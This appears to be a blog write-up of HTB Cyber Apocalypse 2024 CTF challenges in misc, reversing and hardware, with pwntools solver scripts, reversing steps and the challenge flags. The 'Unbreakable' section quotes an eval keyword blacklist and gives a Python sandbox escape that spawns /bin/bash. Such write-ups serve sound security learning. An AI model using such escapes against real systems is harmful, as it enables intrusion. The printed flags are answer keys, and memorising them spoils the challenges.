---
layout: post
title: "HTB Cyber Apocalypse 2024: Hacker Royale - Misc, Reversing and Hardware"
date: 2024-03-14 00:00:00
description: "HTB Cyber Apocalypse 2024: Hacker Royale - Misc, Reversing and Hardware"
tag:
  - Misc
  - Reversing
---

<h2>Table of Contents</h2>
- TOC	- TOC
{:toc}

### **Stop Drop and Roll - Misc**

**Solving Scenario:**\
The service requires input in the format 'STOP, DROP, ROLL.' If the server sends 'GORGE, FIRE, PHREAK,' the correct response should be 'STOP-ROLL-DROP.' Similarly, if only one or two words are sent, such as 'GORGE, FIRE,' the response should be 'STOP-ROLL.' Continue this process until the flag is obtained.

![Stop Drop and Roll](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_stopdropandroll1.png)

Solver:

```python
from pwn import *

mapping = {
"GORGE": "STOP",
"PHREAK": "DROP",
"FIRE": "ROLL"
}

p = remote("94.237.56.188", 46698)

p.recvuntil(b"In this case, you need to send back STOP-ROLL-DROP!")
p.sendline(b"y")
p.recvuntil(b"Ok then! Let's go!")
p.recvline()

while True:
	question = p.recvline().decode().replace("\n", "").split(", ")

	if len(question) == 1:
		answer = mapping[question[0]]
		p.sendline(answer.encode())
		print(answer)
	elif len(question) == 2:
		answer = mapping[question[0]]+"-"+mapping[question[1]]
		p.sendline(answer.encode())
		print(answer)
	elif len(question) == 3:
		answer = mapping[question[0]]+"-"+mapping[question[1]]+"-"+mapping[question[2]]
		p.sendline(answer.encode())
		print(answer)
	elif len(question) == 4:
		answer = mapping[question[0]]+"-"+mapping[question[1]]+"-"+mapping[question[2]]+"-"+mapping[question[3]]
		p.sendline(answer.encode())
		print(answer)
	elif len(question) == 5:
		answer = mapping[question[0]]+"-"+mapping[question[1]]+"-"+mapping[question[2]]+"-"+mapping[question[3]]+"-"+mapping[question[4]]
		p.sendline(answer.encode())
		print(answer)

	p.recvuntil(b"What do you do? ")

p.close()
```

**Flag**: HTB{1_wiLl_sT0p_dR0p_4nD_r0Ll_mY_w4Y_oUt!}

**================================================================================================**

### **Character - Misc**

**Solving Scenario:**\
Only the index of the desired flag character needs to be input.

![Character](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_character1.png)

Automating the process is recommended for faster results, especially given the length of the flag.

Solver:

```python
from pwn import *

p = remote("94.237.49.182", 57581)

p.recv()

flag = ""
index = 0
while "}" not in flag:
	p.sendline(str(index).encode())
	part = p.recvline()
	flag += chr(part[-2])
	index += 1
	print(flag)

p.close()
```

**Flag**: HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}

**================================================================================================**

### **Unbreakable - Misc**

**Solving Scenario:**\
main.py file:

```python
.....SNIP.....
blacklist = [ ';', '"', 'os', '_', '\\', '/', '`',
              ' ', '-', '!', '[', ']', '*', 'import',
              'eval', 'banner', 'echo', 'cat', '%',
              '&', '>', '<', '+', '1', '2', '3', '4',
              '5', '6', '7', '8', '9', '0', 'b', 's',
              'lower', 'upper', 'system', '}', '{' ]

while True:
  ans = input('Break me, shake me!\n\n$ ').strip()

  if any(char in ans for char in blacklist):
    print(f'\n{banner1}\nNaughty naughty..\n')
  else:
    try:
      eval(ans + '()')
      print('WHAT WAS THAT?!\n')
    except:
      print(f"\n{banner2}\nI'm UNBREAKABLE!\n")
```

For Python sandbox escape, bypass using 'exec(input()).'

Solver:

```python
exec(input())
__import__("os").system("/bin/bash")
```

**Flag**: HTB{3v4l_0r_3vuln??}

**================================================================================================**

### **LootStash - Reversing**

**Solving Scenario:**\
The binary stash can be decompiled with IDA, revealing a variable named 'gear.' This variable points to a data segment containing a collection of sentences. The 'search text' function in IDA can be used to locate the flag, formatted as 'HTB.'

![Stash](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_stash1.png)
![Stash](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_stash2.png)

**Flag**: HTB{n33dl3_1n_a_l00t_stack}

**================================================================================================**

### **BoxCutter - Reversing**

**Solving Scenario:**\
Running 'ltrace ./cutter' will result in the flag being displayed.

![BoxCutter](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_cutter1.png)

**Flag** HTB{tr4c1ng_th3_c4ll5}

**================================================================================================**

### **PackedAway - Reversing**

**Solving Scenario:**\
Check the file using 'strings', and it is identified that the binary is compressed with UPX, preventing decompilation.

![PackedAway](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_packedaway1.png)

Decompress the binary using [UPX](https://github.com/upx/upx).
Command: upx -d packed

Run strings and grep "HTB" on the decompressed binary to obtain the flag.

![PackedAway](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_packedaway2.png)

**Flag**: HTB{unp4ck3d_th3_s3cr3t_0f_th3_p455w0rd}

**================================================================================================**

### **Maze - Hardware**

**Solving Scenario:**\
Check the Factory.pdf file located in the folder saveDevice/SavedJobs/Inprogress to retrieve the flag.

![Maze](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_maze1.png)

**Flag**: HTB{1n7323571n9_57uff_1n51d3_4_p21n732}

Thank you for reading this article, i hope it was helpful :-D\
**Follow me on: [Linkedin], [Medium], [Github], [Youtube], [Instagram]**

[Linkedin]: https://www.linkedin.com/in/muhammad-ichwan-banua/
[Medium]: https://banua.medium.com
[Github]: https://github.com/banuaa
[Youtube]: https://www.youtube.com/@muhammad.iwn-banua
[Instagram]: https://www.instagram.com/muhammad.iwn
